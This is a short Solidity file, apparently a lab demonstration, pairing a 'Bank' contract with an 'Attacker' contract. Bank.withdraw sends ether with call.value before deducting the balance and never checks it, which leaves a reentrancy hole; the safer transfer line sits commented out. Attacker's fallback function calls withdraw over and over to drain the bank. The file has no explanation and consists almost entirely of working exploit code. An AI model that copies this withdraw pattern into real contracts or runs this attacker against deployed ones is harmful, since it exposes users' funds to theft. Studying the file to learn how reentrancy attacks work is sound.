pragma solidity ^0.5.0;

contract Bank {

    mapping( address => uint256) public balances;

    event Deposit ( address from, uint256 value);
    event Withdraw( address to, uint256 value);
    event Transfer( address from, address to, uint256 value);

    constructor() public payable{
        balances[msg.sender] = msg.value;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 value) public payable {
        address payable to = address( uint160(msg.sender) );
        //to.transfer(value);
        to.call.value(value)("");
        emit Withdraw(to, value);
        balances[msg.sender] -= value;
    }

    function getContractBalance() public view returns(uint256){
        return address(this).balance;
    }

    function () external payable{
        deposit();
    }


    
}

contract Attacker {
    Bank public target;
    address payable public targetAddr;
     
     constructor( address payable _target) public {
         target = Bank(_target);
         targetAddr = _target;
     }

     function () external payable {
        if( address(target).balance >= 1 ether){
            target.withdraw(1 ether);
        }
     }

     function attack() external payable {
        target.withdraw(1 ether);
     }

     function prepare() external payable{
        require(msg.value >= 1 ether,"not enough eth");
        //targetAddr.transfer(1 ether);
        targetAddr.call.value(msg.value)("");
     }



     function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    
}